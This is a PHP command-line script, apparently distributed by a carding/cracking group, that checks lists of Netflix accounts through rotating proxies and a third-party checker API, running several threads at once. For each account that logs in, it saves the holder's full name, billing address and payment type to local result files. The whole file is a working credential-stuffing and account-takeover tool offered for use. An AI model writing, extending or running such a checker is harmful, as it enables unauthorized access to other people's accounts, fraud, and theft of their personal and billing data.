<?php
/*
UPDATE   : 15 AUG 2025
SCRIPT   : NETFLIX ACCOUNTS CHECKER
VERSION  : 1.5
TELEGRAM : https://t.me/zlaxtert
OWNER    : ZLAXTERT
CODE BY  : ZLAXTERT
GITHUB   : https://github.com/zlaxtertdev
NOTE     : PLEASE DONT CHANGE THIS
*/

require_once 'vendor/autoload.php';
use GuzzleHttp\Client;
use GuzzleHttp\Promise;
use GuzzleHttp\Pool;
use GuzzleHttp\Psr7\Request;

// Color constants
define('MERAH', "\033[91m");
define('HIJAU', "\033[92m");
define('BIRU', "\033[94m");
define('KUNING', "\033[93m");
define('CYAN', "\033[96m");
define('RESET', "\033[0m");
define('WHITE', "\033[97m");

class NetflixChecker {
    private $data = [
        'checked' => 1,
        'hitungdelay' => 0,
        'live' => 0,
        'retries' => 0,
        'dead' => 0
    ];
    
    private $apikey;
    private $api;
    private $proxyType;
    private $client;
    private $localtime;
    private $totalAccounts;
    
    public function __construct($apikey, $api, $proxyType) {
        $this->apikey = $apikey;
        $this->api = $api;
        $this->proxyType = $proxyType;
        $this->localtime = date('Y-m-d H:i:s');
        $this->client = new Client([
            'timeout' => 15,
            'verify' => false,
            'http_errors' => false
        ]);
    }
    
    public function check($email) {
        $email = trim($email);
        if (empty($email)) {
            return;
        }
        
        try {
            $proxy = $this->getRandomProxy();
            $response = $this->makeRequest($email, $proxy);
            
            if ($response['status'] === 200) {
                $this->processResponse($email, $response['body']);
            } else {
                $this->handleError($email, "Response code: " . $response['status']);
            }
        } catch (Exception $e) {
            $this->handleError($email, "Exception: " . $e->getMessage());
        }
    }
    
    private function getRandomProxy() {
        if (!file_exists('proxy.txt')) {
            return ['auth' => '', 'proxy' => ''];
        }
        
        $proxies = file('proxy.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (empty($proxies)) {
            return ['auth' => '', 'proxy' => ''];
        }
        
        $proxy = $proxies[array_rand($proxies)];
        $proxy = str_replace(['https://', 'http://', '/'], '', $proxy);
        
        if (strpos($proxy, '@') !== false) {
            $parts = explode('@', $proxy, 2);
            return [
                'auth' => $parts[0],
                'proxy' => $parts[1]
            ];
        }
        
        return [
            'auth' => '',
            'proxy' => $proxy
        ];
    }
    
    private function makeRequest($email, $proxy) {
        $url = $this->api . '/checker/netflix-checker/?lists=' . urlencode($email) . 
               '&proxy=' . urlencode($proxy['proxy']) . 
               '&proxyAuth=' . urlencode($proxy['auth']) . 
               '&type_proxy=' . urlencode($this->proxyType) . 
               '&apikey=' . urlencode($this->apikey);
        
        try {
            $response = $this->client->get($url);
            return [
                'status' => $response->getStatusCode(),
                'body' => $response->getBody()->getContents()
            ];
        } catch (RequestException $e) {
            return [
                'status' => $e->hasResponse() ? $e->getResponse()->getStatusCode() : 0,
                'body' => $e->getMessage()
            ];
        }
    }
    
    private function processResponse($email, $responseBody) {
        $json = json_decode($responseBody, true);
        
        if (strpos($responseBody, 'Incorrect APIkey!') !== false || 
            strpos($responseBody, 'Apikey has been blocked!') !== false) {
            die("\n" . MERAH . "[!]" . RESET . KUNING . " Incorrect APIkey! or Apikey has been blocked! " . RESET . MERAH . "[!]" . RESET . "\n");
        }
        
        
        
        $msg = $json['data']['info']['msg'];
        
        if (strpos($responseBody, 'SUCCESS LOGIN!') !== false || 
            (isset($json['status']) && $json['status'] === 'success')) {
            $this->handleSuccess($email, $json, $msg);
        } elseif (strpos($responseBody, 'INVALID COOKIES') !== false || 
                 strpos($responseBody, 'Proxy is dead or proxy type is wrong!') !== false) {
            $this->handleRetry($email, $msg);
        } elseif (strpos($responseBody, '"status":"failed"') !== false) {
            $this->handleFailure($email, $msg);
        } elseif (strpos($responseBody, '"status":"die"') !== false) {
            $this->handleFailure($email, $msg);
        } elseif ((isset($json['status']) && $json['status'] === 'failed') || 
                 (isset($json['status']) && $json['status'] === 'die')) {
            $this->handleFailure($email, $msg);
        } else {
            $this->handleUnknown($email, $responseBody);
        }
    }
    
    private function handleSuccess($email, $json, $msg) {
        $this->data['live']++;
        $account = $json['data']['info']['accounts'];

        $fullname = $account['fullname'];
        $type_accounts = $account['type_accounts'];
        $billing_address = $account['billing_address'];
        $billing_city = $account['billing_city'];
        $billing_state = $account['billing_state'];
        $billing_postcode = $account['billing_postcode'];
        $billing_country = $account['billing_country'];
        $billing_countrycode = $account['billing_countrycode'];
        $type_payment = $account['type_payment'];
        
        // Check if account data exists and has required fields
        if (!isset($fullname)) $fullname = '';
        if (!isset($type_accounts)) $type_accounts = '';
        if (!isset($billing_address)) $billing_address = '';
        if (!isset($billing_city)) $billing_city = '';
        if (!isset($billing_state)) $billing_state = '';
        if (!isset($billing_postcode)) $billing_postcode = '';
        if (!isset($billing_country)) $billing_country = '';
        if (!isset($billing_countrycode)) $billing_countrycode = '';
        
        $template = ($type_payment === 'CARD') 
            ? (isset($type_cards)) ? $type_cards . '|' . $account['cards'] : 'CARD|UNKNOWN'
            : (isset($type_payment) ? $type_payment : 'UNKNOWN');
            
        $templateSave = implode('|', [
            $this->localtime,
            $email,
            $fullname,
            $type_accounts,
            $billing_address,
            $billing_city,
            $billing_state,
            $billing_postcode,
            $billing_country,
            strtoupper($billing_countrycode),
            $template,
            'NETFLIX CHECKER',
            './ BY DARKXCODE V1.5'
        ]);
        
        $this->saveResult('result/live.txt', $email);
        $this->saveResult('result/success_log_info.txt', $templateSave);
        
        $this->printStatus(
            $this->data['checked'],
            $this->data['live'],
            $this->data['dead'],
            'LIVE',
            $email,
            $msg,
            HIJAU
        );
        
        $this->data['checked']++;
    }
    
    private function handleFailure($email, $msg) {
        $this->data['dead']++;
        $this->saveResult('result/dead.txt', $email);
        
        $this->printStatus(
            $this->data['checked'],
            $this->data['live'],
            $this->data['dead'],
            'DIE',
            $email,
            $msg,
            MERAH
        );
        
        $this->data['checked']++;
    }
    
    private function handleRetry($email, $msg) {
        $this->data['retries']++;
        
        $this->printStatus(
            $this->data['checked'],
            $this->data['live'],
            $this->data['dead'],
            'RETRIES',
            $email,
            $msg,
            KUNING
        );
        
        $this->check($email);
    }
    
    private function handleUnknown($email, $responseBody) {
        $this->data['retries']++;
        $this->saveResult('result/unknown.txt', $email);
        $this->saveResult('result/response.txt', $responseBody);
        
        $this->printStatus(
            $this->data['checked'],
            $this->data['live'],
            $this->data['dead'],
            'DIE',
            $email,
            'Unknown Response',
            MERAH
        );
        
        $this->check($email);
    }
    
    private function handleError($email, $error) {
        $this->data['retries']++;
        $this->saveResult('result/response.txt', $error);
        
        $this->printStatus(
            $this->data['checked'],
            $this->data['live'],
            $this->data['dead'],
            'ERROR',
            $email,
            $error,
            MERAH
        );
        
        $this->check($email);
    }
    
    private function printStatus($checked, $live, $dead, $status, $email, $msg, $color) {
        echo RESET . " [" . MERAH . $checked . RESET . "/" . HIJAU . $this->totalAccounts . RESET . "][" . 
             HIJAU . "L" . RESET . ":" . HIJAU . $live . RESET . "/" . MERAH . "D:" . $dead . RESET . "]" . 
             $color . " " . $status . RESET . " => " . WHITE . $email . RESET . " | " . 
             $color . $msg . RESET . "\n";
    }
    
    private function saveResult($file, $content) {
        if (!file_exists(dirname($file))) {
            mkdir(dirname($file), 0777, true);
        }
        file_put_contents($file, $content . PHP_EOL, FILE_APPEND);
    }
    
    public function setTotalAccounts($total) {
        $this->totalAccounts = $total;
    }
    
    public function getStats() {
        return $this->data;
    }
}

function clearScreen() {
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        system('cls');
    } else if (strtoupper(substr(PHP_OS, 0, 3)) === 'NT') {
        system('cls');
    } else if (substr(PHP_OS, 0, 3) === 'nt') {
        system('cls');
    }else {
        system('clear');
    }
}

function showBanner() {
    $banner = BIRU . "
      ___  ___   ___  __ ___  ___________  ___  ____
     / _ \/ _ | / _ \/ //_/ |/_/ ___/ __ \/ _ \/ __/
    / // / __ |/ , _/ ,< _>  </ /__/ /_/ / // / _/  
   /____/_/ |_/_/|_/_/|_/_/|_|\___/\____/____/___/
   
            " . MERAH . "*****************************
            " . MERAH . " * " . KUNING . "NETFLIX ACCOUNT CHECKER" . MERAH . " *                                   
            " . MERAH . " * " . HIJAU . "      VERSION 1.5" . MERAH . "       *   
            " . MERAH . "*****************************" . RESET . "\n";
    
    echo $banner;
    echo MERAH . "=" . RESET . str_repeat("=", 57) . "\n";
}

// Read settings
$configFile = 'settings.ini';
$defaultConfig = [
    'SETTINGS' => [
        'APIKEY' => 'PASTE YOUR APIKEY HERE',
        'API' => 'PASTE YOUR API HERE',
        'TYPE_PROXY' => 'PASTE YOUR TYPE PROXY HERE'
    ]
];

if (!file_exists($configFile)) {
    $config = $defaultConfig;
    file_put_contents($configFile, implode("\n", [
        "[SETTINGS]",
        "APIKEY = " . $defaultConfig['SETTINGS']['APIKEY'],
        "API = " . $defaultConfig['SETTINGS']['API'],
        "TYPE_PROXY = " . $defaultConfig['SETTINGS']['TYPE_PROXY']
    ]));
} else {
    $config = parse_ini_file($configFile, true);
    if ($config === false) {
        $config = $defaultConfig;
    }
}

if ($config['SETTINGS']['APIKEY'] === 'PASTE YOUR APIKEY HERE') {
    clearScreen();
    die("\n\n" . MERAH . "[!] Incorrect APIkey! [!]" . RESET . "\n\n");
}

if ($config['SETTINGS']['API'] === 'PASTE YOUR API HERE') {
    clearScreen();
    die("\n\n" . MERAH . "[!] Incorrect API! [!]" . RESET . "\n\n");
}

clearScreen();
showBanner();

// Get user input
echo RESET . "[" . HIJAU . "+" . RESET . "]" . WHITE . " Your lists with extension " . RESET . "(" . WHITE . "example" . RESET . ":" . KUNING . " list.txt" . RESET . ") " . BIRU . ">> " . HIJAU;
$listFile = trim(fgets(STDIN));

if (!file_exists($listFile)) {
    die("\n" . MERAH . "[!] File not found: " . $listFile . " [!]" . RESET . "\n");
}

$accounts = file($listFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
if (empty($accounts)) {
    die("\n" . MERAH . "[!] No accounts found in file [!]" . RESET . "\n");
}

echo RESET . "[" . HIJAU . "+" . RESET . "]" . WHITE . " Put total thread " . RESET . "(" . WHITE . "Recommended 3-5" . RESET . ") " . BIRU . ">> " . HIJAU;
$threads = intval(trim(fgets(STDIN)));

if ($threads < 2) {
    clearScreen();
    die(RESET . "[" . MERAH . "!" . RESET . "]" . WHITE . " MIN THREADS 2 " . RESET . "[" . MERAH . "!" . RESET . "]\n");
}

if ($threads > 10) {
    clearScreen();
    die(RESET . "[" . MERAH . "!" . RESET . "]" . WHITE . " MAX THREADS 10 " . RESET . "[" . MERAH . "!" . RESET . "]\n");
}

clearScreen();
showBanner();

// Initialize checker
$checker = new NetflixChecker(
    $config['SETTINGS']['APIKEY'],
    $config['SETTINGS']['API'],
    $config['SETTINGS']['TYPE_PROXY']
);
$checker->setTotalAccounts(count($accounts));

// Process accounts with limited concurrency
$client = new Client(['timeout' => 15]);

$requests = function ($accounts) use ($checker) {
    foreach ($accounts as $account) {
        yield function() use ($checker, $account) {
            $checker->check($account);
        };
    }
};

$pool = new Pool($client, $requests($accounts), [
    'concurrency' => $threads,
    'fulfilled' => function ($response, $index) {
        // Responses are handled within the check() method
    },
    'rejected' => function ($reason, $index) {
        // Errors are handled within the check() method
    }
]);

$promise = $pool->promise();
$promise->wait();

echo "\nChecking Complete\n";

// Show final stats
$stats = $checker->getStats();
echo "\n" . HIJAU . "=== STATISTICS ===" . RESET . "\n";
echo HIJAU . "Live: " . $stats['live'] . RESET . "\n";
echo MERAH . "Dead: " . $stats['dead'] . RESET . "\n";
echo KUNING . "Retries: " . $stats['retries'] . RESET . "\n";
echo "Checked: " . ($stats['checked'] - 1) . "/" . count($accounts) . "\n\n";